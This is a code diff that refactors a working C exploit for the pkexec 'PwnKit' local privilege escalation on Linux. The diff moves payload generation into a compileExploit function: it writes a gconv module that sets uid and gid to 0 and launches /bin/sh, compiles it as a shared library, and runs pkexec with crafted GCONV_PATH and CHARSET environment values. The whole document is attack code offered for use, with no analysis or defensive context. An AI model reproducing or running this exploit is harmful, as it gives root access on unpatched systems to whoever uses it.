@@ -6,25 +6,41 @@
 #include <sys/types.h>
 #include <fcntl.h>
 
-char *shell = 
-	 "#include <stdio.h>\n"
-        "#include <stdlib.h>\n"
-        "#include <unistd.h>\n"
-        "void gconv() {}\n"
-        "void gconv_init() {\n"
-        "  setuid(0); seteuid(0); setgid(0); setegid(0);\n"
-        "  static char *a_argv[] = { \"sh\", NULL };\n"
-        "  static char *a_envp[] = { \"PATH=/bin:/usr/bin:/sbin\", NULL };\n"
-        "  execve(\"/bin/sh\", a_argv, a_envp);\n"
-        "  exit(0);\n"
-        "}\n";
+
+
+void compileExploit()
+{
+	FILE *fp;
+	fp = fopen("pwnkit/pwnkit.c", "w");
+	if (fp < 0) {
+                perror("fopen");
+		exit(0);
+        }
+
+	char *shell = 
+	    "#include <stdio.h>\n"
+            "#include <stdlib.h>\n"
+            "#include <unistd.h>\n"
+            "void gconv() {}\n"
+            "void gconv_init() {\n"
+            "  setuid(0); seteuid(0); setgid(0); setegid(0);\n"
+            "  static char *a_argv[] = { \"sh\", NULL };\n"
+            "  static char *a_envp[] = { \"PATH=/bin:/usr/bin:/sbin\", NULL };\n"
+            "  execve(\"/bin/sh\", a_argv, a_envp);\n"
+            "  exit(0);\n"
+            "}\n";	
+
+	fprintf(fp, "%s", shell);
+	fclose(fp);
+	system("gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC");
+}
 
 int main(int argc, char *argv[]) {
 	FILE *fp;
     	struct stat st;
 
-	char *a_argv[]={ NULL };
-    	char *a_envp[]={
+	char * a_argv[]={ NULL };
+    	char * a_envp[]={
         	"pwnkit", 
 	    "PATH=GCONV_PATH=.", 
 	    "CHARSET=PWNKIT", 
@@ -60,15 +76,7 @@ int main(int argc, char *argv[]) {
         fclose(fp);
     	}
 
-	fp = fopen("pwnkit/pwnkit.c", "w");
-	if (fp < 0) {
-                perror("fopen");
-		exit(0);
-        }
-	fprintf(fp, "%s", shell);
-	fclose(fp);
+	compileExploit();
 
-	system("gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC");
-	char *env[] = { "pwnkit", "PATH=GCONV_PATH=.", "CHARSET=PWNKIT", "SHELL=pwnkit", NULL };
 	execve("/usr/bin/pkexec", a_argv, a_envp);
 }
